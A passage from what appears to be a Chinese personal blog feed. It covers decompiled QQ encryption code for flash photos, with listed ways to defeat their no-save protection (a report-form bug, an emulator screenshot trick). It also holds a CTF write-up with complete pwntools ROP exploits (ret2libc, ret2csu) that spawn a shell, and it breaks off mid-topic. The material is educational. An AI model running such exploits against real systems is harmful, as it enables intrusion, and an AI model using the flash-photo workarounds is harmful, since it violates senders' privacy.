&#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var2_8, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_11) &#123;</span><br><span class="line"><span class="comment">//略</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//带日志的加密函数，里面调用了上面的a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String string, String object, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//还是带日志的加密函数，里面调用了上面的a(File,File,byte[])</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;encrypt had encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.a(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                file.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Encrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line"><span class="comment">//反编译出来的代码比上面的还乱此略，</span></span><br><span class="line"><span class="comment">//从QLog写入的内容大致可以看出该函数的作用应该是检查文件是否已经加/解密过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] a(<span class="keyword">byte</span>[] arrby) &#123;</span><br><span class="line">        <span class="comment">//保证key数组定长是8？</span></span><br><span class="line">        <span class="keyword">byte</span>[] arrby2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">if</span> (arrby2.length &gt; arrby.length) &#123;</span><br><span class="line">            System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby.length);</span><br><span class="line">            <span class="keyword">return</span> arrby2;</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(arrby, <span class="number">0</span>, arrby2, <span class="number">0</span>, arrby2.length);</span><br><span class="line">        <span class="keyword">return</span> arrby2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(File var0, File var1_5, <span class="keyword">byte</span>[] var2_7)</span> </span>&#123;</span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line">        var2_7 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_7), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var6_15.init(<span class="number">2</span>, (Key)var2_7);</span><br><span class="line">        var2_7 = <span class="keyword">new</span> RandomAccessFile((File)var0, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        var2_7.seek(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>).length);<span class="comment">//跳过文件头</span></span><br><span class="line">        var0 = <span class="keyword">new</span> CipherOutputStream(<span class="keyword">new</span> FileOutputStream((File)var1_5), var6_15);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var1_5 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var2_7.read((<span class="keyword">byte</span>[])var1_5)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var1_5, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_10) &#123;</span><br><span class="line">            <span class="comment">//略</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(String string, String string2)</span> </span>&#123;</span><br><span class="line"><span class="comment">//带日志的解密</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!DESUtil.a(string)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">2</span>, (String)(<span class="string">&quot;decrypt had no encrypt,file:&quot;</span> + string));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">long</span> l = System.currentTimeMillis();</span><br><span class="line">                Object object = string + <span class="string">&quot;.tmp&quot;</span>;</span><br><span class="line">                File file = <span class="keyword">new</span> File(string);</span><br><span class="line">                <span class="keyword">long</span> l2 = file.length() / <span class="number">1024</span>;</span><br><span class="line">                <span class="keyword">if</span> ((object = <span class="keyword">new</span> File((String)object)).exists()) &#123;</span><br><span class="line">                    object.delete();</span><br><span class="line">                &#125;</span><br><span class="line">                DESUtil.b(file, (File)object, string2.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                FileUtils.a((File)object, (File)file);</span><br><span class="line">                object.delete();</span><br><span class="line">                <span class="keyword">if</span> (QLog.isDevelopLevel()) &#123;</span><br><span class="line">                    QLog.d((String)<span class="string">&quot;DESUtil&quot;</span>, (<span class="keyword">int</span>)<span class="number">4</span>, (String)(<span class="string">&quot;DES Decrypt filePath:&quot;</span> + string + <span class="string">&quot;,key:&quot;</span> + string2 + <span class="string">&quot;,costTime:&quot;</span> + (System.currentTimeMillis() - l) + <span class="string">&quot;,fileSize:&quot;</span> + l2 + <span class="string">&quot;KB&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (UnsupportedEncodingException unsupportedEncodingException) &#123;</span><br><span class="line">            unsupportedEncodingException.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我以为胜利在望，我请教了师兄，发现其中几个包得不到，根本破解不了（o(*≧▽≦)ツ┏━┓）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br></pre></td></tr></table></figure><p>除此之外，还不知道key从何来，大佬也说要么需要处于登录状态用一定方式从服务器得到，要么从本地消息对象的属性中获得，反正哪个都不容易，单靠一个_fp文件就解密出来原文件应该不太现实。所以我就只能放弃了。</p><h1 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h1><p>虽然前面说了没解出来，但是不代表不能获得照片啊（￣︶￣）↗　</p><p>提供三种方法：</p><ul><li><p>方法一：利用bug实现，举报好友填写信息时勾选闪照，在举报成功后会显示闪照内容（好友：我tm真的谢谢你），不过我觉得后面腾讯应该会修复。</p></li><li><p>方法二：最简单的，用另一个手机拍照，最实用最靠谱的(～￣▽￣)～</p></li><li><p>方法三：利用模拟机打开qq，在模拟机里面是无法限制主机截图的，下载一个VMOS模拟机后（应用商店有）在里面下载一个qq打开闪照时就可以截图了[]<del>(￣▽￣)</del>*</p></li></ul><p>个人观点：我觉得非必要情况没必要去获得闪照，毕竟别人发闪照就是不想让你保存，所以看看就行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-x64</title>
      <link href="/post/ROP-x64.html"/>
      <url>/post/ROP-x64.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP</p></blockquote><h1 id="pwn07"><a href="#pwn07" class="headerlink" title="pwn07"></a><a href="https://ctf.show/files/c4d406012dcbf2b25fd23b6a48bf2b12/pwn?token=eyJ1c2VyX2lkIjo0MjMyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo5NX0.YWwLmA.og84JNMuW7w7Z0oZIr90NIxImf4">pwn07</a></h1><p>做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。**64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)**，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p><p>泄露puts函数地址需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure><p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28138</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04006e3</span>  <span class="comment"># ROPgadget --binary pwn1 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;</span></span><br><span class="line">ret_addr = <span class="number">0x4004c6</span> <span class="comment"># ROPgadget --binary pwn1 --only &#x27;ret&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)  <span class="comment"># 泄露puts函数的地址</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 接收地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)  <span class="comment"># 匹配libc库</span></span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  <span class="comment"># 计算基地址</span></span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)  <span class="comment"># 计算system函数地址</span></span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  <span class="comment"># 计算bin/sh字符串地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(<span class="number">0x4004c6</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)  <span class="comment"># 构造rop链</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>由于程序没有调用puts函数，我们不能通过puts函数泄露函数地址得到libc。所以，这次我们利用一个万能gadgets来泄露函数地址获得libc，这个gadgets在__ libc_csu_init函数里面，而这个  __libc_csu_init函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<img src="https://i.loli.net/2021/10/17/tcU5L9SvaAFTsMB.png" alt="屏幕截图 2021-10-17 200528.png"></p><p>通过objdump -M intel -d level5命令来查看反汇编，将其中一部分指令划分为gadgets1和gadgets2，其中gadgets1作用是将栈里面的值传给寄存器，而gadgets2作用是将一些寄存器的赋给另一些寄存器。</p><p>接下来就是利用这个gadgets来获取shell</p><ul><li>利用栈溢出执行 libc_csu_gadgets 组装好 write 函数并泄露write函数地址，并使得程序重新执行 main 函数</li><li>根据 libcsearcher 获取对应 libc 版本以及system函数地址</li><li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入system 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li><li>再次利用栈溢出执行 libc_csu_gadgets 执行system(‘/bin/sh’) 获取 shell。</li></ul><p><img src="https://i.loli.net/2021/10/17/W9hdYOlz2JkwnSK.png" alt="image.png"></p><p>下图展示了如何利用万能gadgets的流程：</p><p><img src="https://i.loli.net/2021/10/18/IiotnxPjeKg72OS.png" alt="image.png"></p><h2 id="第一次发送payload："><a href="#第一次发送payload：" class="headerlink" title="第一次发送payload："></a>第一次发送payload：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x400606</span>)+p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(<span class="number">0x4005F0</span>) + <span class="string">&quot;a&quot;</span>*<span class="number">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure><p>p64(0x400606)：是gadgets1的地址</p><p>p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ：对应的寄存器为rbx,rbp,r12,r13,r14,r15</p><p><strong>rbx存入0是因为gadgets2中rbx会加1再与rbp比较，如果不同就会跳转，不能继续按我们的要求执行，所以必须保证rbx加1以后要和rbp的值一样，所以后面的rbp填入1；p64(gadgets1)将会填入r12，因为gadgets2会跳转到r12+rbx * 8的位置，因为rbx为0所以就是跳转到r12的位置； p64(1) + p64(got_write) + p64(8)将会填入r13,r14,r15寄存器，再gadgets2中会转移到edi,rsi,rdx中，也就是用于传参的前三个寄存器；p64(got_write) + p64(1) + p64(got_write)+ p64(8)最后组装成write(1,address,8)泄露write函数地址</strong></p><p>p64(0x4005F0)：是gadgets2的地址</p><p>“a”*56+p64(main_addr) ：因为gadgets2后面是gadgets1，gadgets1会弹出栈里面的值，为了不让gadgets1影响后面操作，就填入无用字符串，最后跳转会main函数</p><p><img src="https://i.loli.net/2021/10/18/4fbryJxcqLZoTlH.png" alt="image.png"></p><h2 id="第二次发送payload："><a href="#第二次发送payload：" class="headerlink" title="第二次发送payload："></a>第二次发送payload：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span>+p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)+p64(<span class="number">0x4005F0</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">56</span>+p64(main)</span><br></pre></td></tr></table></figure><p> p64(got_read) + p64(0) + p64(bss_addr) + p64(16)：组装成read(0,bss_addr,16)，作用是向bss段写入16字节的东西</p><p><img src="https://i.loli.net/2021/10/18/SfaDY9HqAkTUGrd.png" alt="image.png"></p><h2 id="第三次发送payload"><a href="#第三次发送payload" class="headerlink" title="第三次发送payload"></a>第三次发送payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload3 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x4005F0</span>) + <span class="string">&quot;a&quot;</span>*<span class="number">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure><p>p64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)：组装成system(“bin/sh”)，因为只有一个参数所以后面两个填零不会造成什么影响</p><p><img src="https://i.loli.net/2021/10/18/WrZCcJ9djxq6feP.png" alt="image.png"></p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]  </span><br><span class="line">payload1 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>)   <span class="comment"># 跳转到gadgets1并构造write函数泄露write函数</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>)   <span class="comment"># 跳转到gadgets2将对应参数放入对应寄存器</span></span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload1#############\n&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment"># 接收地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libcbase = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_address:&#x27;</span>,system_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libcbase:&#x27;</span>,libcbase</span><br><span class="line">bss_addr=<span class="number">0x601028</span>  <span class="comment"># 用于写入system函数以及bin/sh字符串</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">payload2 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)   <span class="comment"># 构造read函数向bss段写入数据</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) </span><br><span class="line">payload2 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(start)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload2#############\n&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">payload3 =  <span class="string">&quot;a&quot;</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)   <span class="comment"># 跳转执行bss段中的内容</span></span><br><span class="line">payload3 += p64(<span class="number">0x4005F0</span>) </span><br><span class="line">payload3 += <span class="string">&quot;a&quot;</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(start)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload3#############\n&quot;</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/18/osBbMZqYGX8e41x.png" alt="image.png"></p><h1 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h1><p>题目存在溢出，但是只溢出16个字节，而64位要构造rop链通常需要4*8=32字节，所以无法直接泄露。但是这个题目是无限输入的，所以我们可以尝试采取栈迁移的方式。栈迁移适用于以下情况：</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 